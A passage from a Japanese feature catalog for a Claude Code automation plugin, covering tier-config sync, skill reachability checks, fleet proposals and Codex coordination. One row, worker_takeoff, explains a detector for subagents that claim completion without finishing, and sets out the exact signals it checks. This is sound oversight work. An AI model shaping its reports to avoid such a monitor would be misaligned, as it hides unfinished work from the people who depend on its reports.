`targets.{agents,settings,routing_rules}` にユーザーが明示登録する。auto-discovery は「意図しないファイルを書き換える」事故コストが高く、tacchi レビューで却下。③**target 種別ごとの反映方式が非対称**（データ形式が違うため）: agent は frontmatter の自己申告 `tier:` を読み `model:`/`effort:` 行を**行単位テキスト編集**で更新（`frontmatter.find_frontmatter_close` で frontmatter 境界だけ特定し、YAML 全体は `yaml.safe_load`→`yaml.dump` で**再シリアライズしない** — コメント・キー順序を壊す既存 `frontmatter.update_frontmatter` の弱点を踏まないため。本文は `text[:3] + 編集済みyamlブロック + text[end:]` で byte-exact 保証）。settings は JSON なので `json.loads`→dict 更新→`json.dumps(indent=2)` で足りる（他キー順序・2スペースインデント・末尾改行の有無を維持）。routing_rule は model-routing.md の中の「散文 rule」に埋め込む必要があるため `<!-- evolve-tier:begin -->`/`<!-- evolve-tier:end -->` マーカーを新設し、その間だけを1行（tier 順固定で生成）に機械的に置換（マーカー不在は skip・自動挿入しない＝ユーザーが明示的にマーカーを置いた rule ファイルだけを対象にする）。④**dry-run 既定 + 冪等性** — `plan_sync` は読み取りのみ（書込ゼロを byte 比較でテスト担保）で `{path, type, status, diff, reason}` を返す。`apply_sync` は drift のみ書き込み、適用直後に再度 `plan_sync` すると全て `in_sync` になることをテストで保証（同じ入力から同じ出力を再生成する決定論的な desired-state 計算のみで実現、乱数・タイムスタンプを埋め込まない）。⑤**stale-mention advisory** `tier_policy_drift.scan_stale_mentions()` — 正典のどの tier の model にも使われなくなったエイリアス（例: opus 撤去後の "opus"）が `advisory_scan` ディレクトリ配下の散文（rules 等）や agent targets に残っていないかを単語境界・case-insensitive で検出する。**sync 対象にはしない**（散文の自由記述を機械編集すると文意を壊すリスクが高く、人間判断に委ねる設計確定事項）。⑥**fail-open ゲート** — `load_tiers_config(strict=False)`（既定）は config 不在/JSON 破損/スキーマ不正のいずれでも DEFAULT_TIER_POLICY ベースへフォールバックし `_load_error` に理由を記録するのみで例外を投げない（`agent_tier.check_agent_tier` 等の audit gate 呼び出し元が config 起因で落ちないようにするため）。`strict=True` は CLI の `sync`/`drift` からのみ使い、config が壊れているのに気づかず古い正典で反映してしまう事故を防ぐためパス入り `ValueError` を投げる。既存 gate `agent_tier.check_agent_tier` は本 issue で **call-time** `tier_policy.load_tier_policy(strict=False)` を参照するよう配線し直し（module-level キャッシュはユーザー config の実行時変更に追従しない既知 pitfall `pitfall_module_level_datadir_import_copy` を踏むため禁止）、ユーザーが `evolve-tier set` した瞬間から gate の期待値に反映される。`agent_tier.TIER_POLICY`（後方互換の静的スナップショット・実 importer は Grep で未検出）は `tier_policy.DEFAULT_TIER_POLICY` 由来に変更。`DEFAULT_TIER_POLICY` の値自体は既存 `agent_tier.TIER_POLICY`（2026-07-10 opus 4.8 廃止改定済み値）と model/effort が同値で、各ティアに日本語の役割 description を追加しただけ（振る舞いの後方互換を担保）。model バリデーションは `agent_quality_catalog.MODEL_ALIASES` を単一ソースにし、exact ID（`EXACT_MODEL_ID_PATTERN` 一致）と `"inherit"` は tier の model として拒否（エイリアスを促すエラーメッセージ）、`model=haiku` かつ `effort` 指定は拒否（haiku は effort 非対応）。CLI 構成: `bin/evolve-tier`（薄い entry・`bin/evolve-fleet` と同じ bootstrap 流儀）→ `tier_policy_cli.main(argv=None)`（argparse subparsers: `show`/`init`/`set`/`sync`/`drift`、exit code は正常0・引数/バリデーションエラー2・config strict エラー1で `bin/evolve-scaffold-advisory` と同じ契約）。800行ファイルサイズバジェットに備え、config load/set コアを `tier_policy.py`、sync エンジンを `tier_policy_sync.py`、stale-mention advisory を `tier_policy_drift.py` に分割（各ファイル300行未満、循環 import を避けるため CLI 側から3モジュールを直接 import する構成で相互 import なし）。TDD 80件（tier_policy 31 / tier_policy_sync 28 / tier_policy_drift 7 / tier_policy_cli 14）+ 既存 `test_agent_tier.py`/`test_sections_agent_tier.py` 計31件は無改変で green（call-time 解決に切り替えても HOME 隔離下では DEFAULT_TIER_POLICY が使われ挙動不変）。決定論・LLM 非依存（`bin/evolve-tier` + `scripts/lib/tier_policy.py` + `tier_policy_sync.py` + `tier_policy_drift.py` + `tier_policy_cli.py` + `agent_tier.py`） |
| `tier_skill` | `/evolve-anything:tier`（`skills/tier/SKILL.md`）— `evolve_tier` CLI（`bin/evolve-tier`、上記 #193 参照）の**対話 UX ラッパー**。正典管理・sync/drift の実体ロジックは一切持たず（正典・実装の SoT は `tier_policy.py`/`tier_policy_sync.py`/`tier_policy_drift.py`/`tier_policy_cli.py` のまま）、CLI 呼び出しの前後で「何をどう変えるか」の解釈と承認取得だけを担う薄いレイヤー。フロー: 現状表示（`show`）→ ユーザー発話から tier（HEAD/HARD/NORMAL/MECH/REVIEW）/model/effort を解釈（曖昧なら `AskUserQuestion`）→ `set` で正典更新 → `sync`（`--apply` 無し = dry-run）の diff を全件提示 → **ユーザーの明示承認後にのみ** `sync --apply` → `drift` advisory 表示。CLI 側の設計確定事項（stale mention は自動書換しない・`~/.claude/model-tiers.json` 破損時の strict エラーを握り潰さない・`targets` 未登録ファイルは自動検出しない）をスキル本文にも明記し、頭（オーケストレーター）自身のセッションモデル変更は sync 対象外（別 concern として `/model` を案内）と切り分ける。同梱スクリプトは相対パスでなく `${CLAUDE_PLUGIN_ROOT}/bin/evolve-tier` の絶対参照で呼ぶ（対象 PJ の cwd で実行される既知 pitfall `pitfall_skill_md_plugin_root` 準拠・回帰は `scripts/tests/test_skill_md_plugin_paths.py`）。コード変更なし（SKILL.md 追加のみ）（`skills/tier/SKILL.md`） |
| `worker_takeoff` | subagent の「completed 報告」↔内部完遂の意味的乖離を決定論検知する worker-takeoff advisory section（#161、arXiv 2607.02507 "What LLM Agents Say When No One Is Watching" の off-record/public 乖離検知を自己運用に転写）。発端: MEMORY 頻出の worker-takeoff（completed≠完遂）— impl-worker が中間ナレーションで止まったまま harness に completed 扱いされ、報告は「done」に見えても `git log`/`git status` は未完遂という乖離を、これまで頭が毎回手で git 突合して回収していた（実測で同日5件観測）。既存の `pitfall_manager/rationalization.py` は correction のスキップ言い訳検出であり報告↔内部軌跡の乖離検知ではなく、`subagent_traces`/`sections_subagent_traces`（#38）も per-agent_type の tool error/一発成功率を surface するのみで報告テキスト自体は見ていない——というギャップに直撃する。**設計判断（read-time 導出・新ストアなし）**: subagent_traces.jsonl は transcript の tool_use/tool_result カウントのみを持ち報告テキストを保持しないが、subagents.jsonl（SubagentStop hook の生ログ）には既に `last_assistant_message`（最終 assistant テキスト、hooks 側で `MAX_MESSAGE_LENGTH`=500 字に先頭から切り詰め済み）フィールドがある。新ストア・新フィールド・ingest 変更を追加せず、この既存フィールドを直接読んで read 時に判定する（`learning_derive_state_from_logs_not_forward_write` 方針。`sections_subagent_noise.py`（#142-8b）と同型の DATA_DIR union read + pj_slug scope + `is_noise_agent_type` 除外 + agent_id 単位 last-append-wins）。**検出コア** `rl_common.detection.detect_takeoff_divergence`（純関数・ゼロ LLM）: 保守側（FP 抑制）の2シグナル AND — ①完了署名が無い（`=== ... ===` 終端マーカー（IMPL COMPLETE 等の具体語彙を限定せず bookend 構造そのものを検出）や `##` 見出し中の完了/報告語が本文中に見当たらない）②前向きナレーション終端（テキスト全体の末尾が `:`/`：` で終わる、または改行・文末記号（。！？.!?）で区切った最終セグメントが Now/Next/Let's/Let me/I'll/I will/going to/we'll/we will 系の進行形で始まる）。①単独では flag しない（終端マーカー規約を持たない agent 種で FP を量産するため）。②の文単位分割は、transcript のテキストブロックが改行を挟まず1行に複数文が詰まっているケース（"...しました。Now let's ..."）でも文頭マッチできるようにするため（行単位だと文頭にならず検出漏れになる）。**切り詰め安全策**: `last_assistant_message` の長さが `TRUNCATED_LEN`(=500・hooks 側定数と値のみ複製) 以上なら、元メッセージがそれより長かった可能性があり切り詰め後の末尾は実際の文末でない（完了署名が末尾規約の agent 種では打ち切りで署名自体が欠落しうる）ため判定不能 `None`（未評価）を返す。空/非文字列も `None`。**読み配線**: `audit/sections_takeoff.compute_worker_takeoff` が当 PJ の subagents.jsonl を union read（`_iter_data_dirs`）し `_normalize_pj` で当 PJ scope、agent_id 単位 last-append-wins で辞書に集約後、noise agent_type（空/ID形）除外済みの各レコードに `detect_takeoff_divergence` を適用し agent_type 別に `{n, suspected}` を集計。**沈黙境界**: 当 PJ レコード 0 件（評価対象なし）→ None、suspected 0 件 → None（subagent_noise と同じ「無ければ非表示」慣習）。suspected>0 の agent_type のみ ⚠ 行 + 手動確認（transcript・git log/git status）への誘導文を surface。**スコア重み非関与**（advisory のみ）。`_OBSERVABILITY_BUILDERS` に `worker_takeoff` key で `subagent_traces`/`subagent_noise` に隣接登録。**スコープ外**: LLM 判定（Haiku バッチ格上げ、issue の再評価条件に明記の通り精度不足が実データで確認できたら検討）は今回実装しない。TDD 18件（純関数10 + section 8）・決定論・LLM 非依存（`scripts/lib/rl_common/detection.py`(`detect_takeoff_divergence`) + `scripts/lib/audit/sections_takeoff.py`、#161） |
| `skill_reachability` | SKILL.md が「`func(args)` を実行する」と宣言している callable が実コードのどこからも呼ばれていない（到達不能）状態を決定論検出する（#191、#170 `intention_check` ゾンビ宣言の再発防止）。発端: #170 で `intention_check(candidate, original)` が SKILL.md 散文に「実行する」と明記されながら定義モジュール自身と test 以外どこからも呼ばれていなかったことが発覚し、その場で削除対応したが「宣言↔実装突合の恒久検知」自体は別 issue（#191）としてスコープ外にされていた（設計判断コスト・FP 較正コストが高いため）。既存の `hook_drift.py`（dead_ref）はスキルの実在突合のみで関数到達可能性は見ない、dogfood gate Layer 3 は SKILL.md コードブロックの抽出実行のみ（散文中の宣言は対象外）——というギャップに直撃する。**設計3ステップ**（`scripts/lib/skill_declaration_reachability.py`）: ①`extract_declared_calls(skill_md)` — SKILL.md をコードブロック除去（fence 区間を空行化し行番号を保存）した prose からバッククォート inline code span `` `func(args)` ``（dotted 名可・最終セグメントを bare 関数名として採用）を正規表現抽出。裸の prose（バッククォート無し）は抽出しない（疑似コード/例示との区別、実較正で `gstack(340) / evolve-anything(30)` のような非呼び出し記法もバッククォート内に混在することを確認したが c の既存判断フィルタで自然除外）。②`build_call_graph_index(repo_root, names)` — `scripts/**/*.py` + `skills/**/scripts/**/*.py` を AST 走査し定義位置（`tests/` 配下の def は「自コードベースの実関数」と認めず除外）と参照位置（`ast.Name`/`ast.Attribute` の identifier 一致 + `from mod import func as alias` エイリアス越しの参照解決）の索引を構築。③`detect_unreachable_declarations` — 定義モジュール自身と `tests/` 配下のみが caller なら「到達不能」と判定。**caller 判定は .py の AST 参照だけでなく skills/\*/SKILL.md の fenced code block（python/bash、`dogfood/skill_blocks.extract_code_blocks` 再利用）本文のテキスト一致も見る**（当初 .py のみで設計したところ agent-brushup の `check_quality()`（SKILL.md の python code block から実際に呼ばれている）等を誤って zombie 判定した実較正結果を受けた必須修正。Layer 3 が同じ block の実行検証を担うためここでは静的一致で十分）。**FP 較正で確定した2つの除外規則**（precision 優先）: ⒜ 複数モジュールに同名定義がある candidate は誤帰属回避のため判定対象から除外（ambiguous_count）。⒝ 自コードベースに定義が無い candidate（Python 標準関数・外部ライブラリ・CLI コマンド形）は対象外（unresolved_count）— `Path(__file__)`/`bin/evolve-tier show` 等は def が無いため allowlist 不要で自然除外。動的呼び出し（getattr/文字列キー dispatch）は識別子ベース静的解析の守備範囲外と明記（実較正でこのパターンによる誤検出は0件）。**実 SKILL.md 全件（25個）較正結果**: 宣言 47 件評価・ambiguous 0・unresolved 2（`Path`/`gstack`）・**到達不能 11 件**（`check_upstream`／`verify_fix`+`check_regression`+`rollback_fix`+`record_outcome`（remediation の auto_fixable 検証パイプライン全体が未配線）／`add_artifact_suppression`／`add_merge_suppression`／`write_context_seed`／`format_correlation_report`／`_score_judgment_complexity_static`／`detect_contradiction`）— 全件手動 grep（リポジトリ全体・拡張子問わず）で false positive 0 件を裏取り済み。**配線**: `audit/sections_skill_reachability.build_skill_reachability_section`（#115 共通枠 `build_advisory_section` 経由・`_OBSERVABILITY_BUILDERS` 登録・has_skills=False で沈黙・該当なしで✓・該当ありで⚠+evidence）+ `bin/evolve-dogfood-gate --layer light`（および `all`）の Layer 3 直後に非ブロッキング advisory として組込（`dogfood/cli._run_skill_reachability_advisory`/`_print_skill_reachability_advisory`、Layer1/2/3 と異なり **exit code に一切加算しない** — 静的解析ゆえ FP 較正コストが高く、ブロッキング判定は audit 側の人間確認に委ねる設計）。**実装中の実機発見バグ**: `.claude` 除外フィルタを glob 結果の絶対パス全体（`f.parts`）で判定していたため、worktree（`<repo>/.claude/worktrees/<id>/...`）から実行すると repo_root 自身の絶対パスに `.claude` が含まれ全ファイルが誤除外される false negative（evaluated_count が常に0）を実行時に発見（testpaths_coverage.py の `_EXCLUDE_DIRS` と同じ「相対パスで判定する」慣習に倣い修正・回帰テスト追加）。新ストアなし・read-time 決定論・LLM 非依存。TDD 30件（core 20 / section 3 / dogfood advisory 7）（`scripts/lib/skill_declaration_reachability.py` + `audit/sections_skill_reachability.py` + `dogfood/cli.py`、#191） |
| `fleet_propose` | queue（#79/#80）が挙げた「evolve 待ち PJ」に対して `run_evolve(project_dir, dry_run=True)` の提案だけをバッチ生成し集約レポートに束ねる `bin/evolve-fleet propose`（daily-evolve Epic #78 Phase 2、closes #81）。発端: Phase 1 は「evolve 待ち PJ」を列挙するだけで、実際の dry-run 提案を朝にまとめて読める形に集約する経路が無かった。**入力**: 既定は `DATA_DIR/evolve-queue.json`（#80 の派生物・`daily.queue_notice.read_queue`/`_stale_days` を再利用して staleness advisory を表示）、`--live` は `fleet queue` と同一の `_gather_queue_result` を直接実行して最新化。`select_targets` が `queue["queue"]`（既に material_count 降順）の先頭から `--max-pj`（既定5）件を対象にする（**queue 掲載 PJ のみ・全 PJ 強制でない**）。**llm-batch-guard 承認ゲート**: `estimate_cost`/`format_cost_confirmation` が対象 PJ・PJ 別 material_count・使用モデルを提示し `confirm_batch`（`--yes` でスキップ）で y/n 確認。material_count は「evolve 待ち度合いの proxy」と明記し、トークン概算は確認手段が無いため提示しない（factual-claims 準拠 — 捏造しない）。`run_evolve(dry_run=True)` は評価系を skip/cache 参照するため通常 LLM 呼び出しはゼロ（根拠: `dogfood/layer1.py._run_evolve_dry_run` の実装コメント「LLM は dry-run 経路では呼ばれない」）。稀に audit の constitutional score が Haiku を呼ぶが、レイヤ単位キャッシュで通常 0〜1 コール/PJ・上限4（`phases_diagnose.py` コメント根拠）。**実行**: `run_propose_batch` が対象 PJ を**順次**（並列しない）`run_evolve(project_dir=..., dry_run=True)` する。project_path 不明/不在・run_evolve の例外は `status=error` として記録し他 PJ の実行を止めない（1 PJ 失敗が全体を止めない設計）。**重複・ノイズ抑制**（既存 API 再利用・再実装しない）: `filter_previously_rejected_candidates` が `evolve_decisions._extract_candidates`（discover matched_skills + skill_evolve high/medium の候補抽出）+ `optimize_history_store.load_history(slug)`（`source=evolve_diff` の直近判定）を組み合わせ、skill_name 単位で timestamp 最大の判定が `human_accepted=False`（reject）なら再提示から除外する（remediation/skill_triage は run_evolve 自体が triage_ledger ベースの suppression を既に内蔵するため対象外）。抑制件数は `summarize_pj_result` の `skill_evolve_suppressed_rejected` で transparency として残す（silent に消さない）。**出力**: `build_batch_report`/`render_markdown_report`/`write_reports` が `DATA_DIR/evolve-proposals-<YYYYMMDD>.md`+`.json`（`evolve-queue.json` と同じ read 専用派生物。**#399 codex round1 是正**: `.json` は store_registry に derived_cache として宣言済み、`.md` は機械可読 reader が無いため宣言対象外）を書く。JSON は巨大な raw result（audit markdown 等）を丸ごと持たず `_distill_pj_entry` で件数サマリ + suppressed 候補 + slug/env_tier のみに絞る（「巨大 JSON 切断」再演の回避）。同日再実行は上書き（evolve-queue.json と同じ運用）。**分割**: `cli.py` の 800 行ハード上限のため subcommand 本体を `cli_propose.py` に分離（`cli_tokens.py` と同型・循環回避のため `--live` 分岐の `_gather_queue_result` は関数内遅延 import）。**dry-run 純度 E2E**: 実 `run_evolve` を使い（stub でなく）2 PJ を batch 実行した前後で DATA_DIR 配下 SHA256 が不変（既存 `test_dry_run_no_write_e2e.py` の documented exceptions と同じ許容リスト）であることを assert（#308/#513 の教訓）。TDD 39件（select_targets/estimate_cost/confirm_batch/reject 抑制6件/summarize/バッチ実行/レポート/CLI 配線5件 + dry-run 純度 E2E）・決定論部は LLM 非依存（`run_evolve_fn` DI でテスト時 LLM ゼロ）（`scripts/lib/fleet/propose.py` + `scripts/lib/fleet/cli_propose.py`、#81） |
| `fleet_pr` | `evolve-fleet pr-start/pr-finish` の安全な外殻。worktree は repo 外の configurable root に `<executor>/<issue>-<slug>-<suffix>` で作成し、branch は `<executor>/<issue>-<slug>`。commit は必須 `--commit-path` allowlist だけを stage し、cached diff に範囲外 path があれば拒否する `commit_paths` を使用。executor は `claude` / `codex` を記録し、既存 proposal workflow と push account guard を維持する。commit message に `Co-Authored-By` は付けない。適用そのものは対話 evolve のまま人間が行い、**マージも常に人間**が行う（#82, #268）。 | `scripts/lib/fleet/pr.py`, `scripts/lib/fleet/cli_pr.py` |
| `agent_coordination` | Claude Code 主担当・Codex opt-in lane の排他制御。`start`はownership取得とrepo外worktree作成を同一lock内で行い、manifest書込失敗時はworktree＋branchをrollback。lockはPID/TTLでstale回復し、明示`force-unlock --yes`も持つ。`handoff`はrenameをdelete+addとして検証し、同一内容の再実行は冪等。`finish`は削除やmergeをせず状態だけを完了化する（#268）。 | `scripts/lib/agent_coordination/`, `bin/evolve-agent-task` |
| `codex_config_cleanup` | `~/.codex`汚染の限定cleanup。auditは4カテゴリ、applyは文脈から復元先が一意な`<repo>/.Codex/→<repo>/.claude/`と`~/.Codex/→~/.codex/`等だけを対象にし、裸の`.Codex/`と`Codex Code`はaudit-only。applyは明示`--yes`、root内path、現内容からのreplacement再導出、before/after hash、同階層backup、atomic replaceを必須にする（#268）。 | `scripts/lib/agent_coordination/codex_cleanup.py`, `bin/evolve-codex-config-cleanup` |
| `runtime_telemetry` | 初期較正対象`usage`/`sessions`/`errors`のhook writerに`runtime=claude|codex`を追加。payload→`EVOLVE_RUNTIME`→既定`claude`の順で解決。`runtime-summary`はusage/errorsをJSONL、sessionsを正準`session_store.read_session_records`（sessions.db＋未ingest JSONL union）から読みruntime別に分離表示する（#268）。**Codex hook 本配線は payload fixture 取得まで保留**（#268）— CC 側の hook writer は本較正で有効化済みだが、Codex 側から `runtime=codex` を実際に送出する hook 配線は、実 payload 形状を確認できる fixture が揃うまで意図的に未着手のまま残している。 | `hooks/common.py`, `agent_coordination/runtime_summary.py` |
| `codex_usage` | `evolve-fleet status`/`tokens` に codex CLI（`~/.codex/state_5.sqlite`）利用状況の軽量 advisory を追加（#245）。**動機**: codex CLI は独自の `threads` テーブルに PJ (cwd) 別セッション履歴を持つが、fleet 側の `token_usage_store`（CC 側）とは単位・粒度が異なるため合算せず別枠で可視化する。**実装**: `collect_codex_usage()`（`scripts/lib/fleet/codex_usage.py`）が read-only URI（`file:...?mode=ro`、パス中の `?`/`#` 等 URI 予約文字は `urllib.parse.quote` でエスケープ）で `threads` テーブルを開き、直近 `window_days`（既定30日）の `updated_at`(_ms) を持つスレッドを cwd（`audit.outcome_metrics._normalize_pj` で slug 化）別にセッション数・`tokens_used` 合計・最終利用時刻へ集計する。**3つの degrade ケースをすべて fail-open**: ① DB 不在（codex 未導入）→ `CODEX_STATUS_MISSING` で無音 skip、② open/query 失敗（ロック中等）→ `CODEX_STATUS_LOCKED` で `format_codex_usage_section` が警告1行のみ表示、③ スキーマ相違（`threads` テーブル/列なし、`sqlite3.OperationalError` メッセージの `no such table`/`no such column` 判定）→ `CODEX_STATUS_SCHEMA_MISMATCH` で無音 skip。**二段防御**（外部レビュー指摘対応）: SQLite の動的型付けにより `tokens_used`/`updated_at_ms` 列に型不正値が入り得るため行単位の型変換をすべて先に完了させてから state を更新する try/except（例外時は当該行のみ skip・部分更新を残さない）に加え、集計関数全体を broad except で包み未知の例外は `CODEX_STATUS_LOCKED` へ fail-open。`format_codex_usage_section` も整形全体を try/except で包み失敗時は空文字列を返す（advisory が本体表示を絶対に落とさない）。表示は `status`/`tokens` の既定テキスト出力末尾に `## Codex CLI 利用状況（直近30日）` として別セクション追加（`--json` 出力は既存スキーマ非変更・対象外）。TDD +19件（degrade 3ケース・window_days フィルタ・NULL updated_at_ms フォールバック・行単位型不正・formatter 複数パターン・未知例外の LOCKED 変換・API surface snapshot 追記含む）。決定論・LLM 非依存・新規ストアなし（他所 DB の read-only 参照のみ）（`scripts/lib/fleet/codex_usage.py` + `scripts/lib/fleet/formatters.py` + `scripts/lib/fleet/__init__.py` + `scripts/lib/fleet/cli.py` + `scripts/lib/fleet/cli_tokens.py`、#245） |
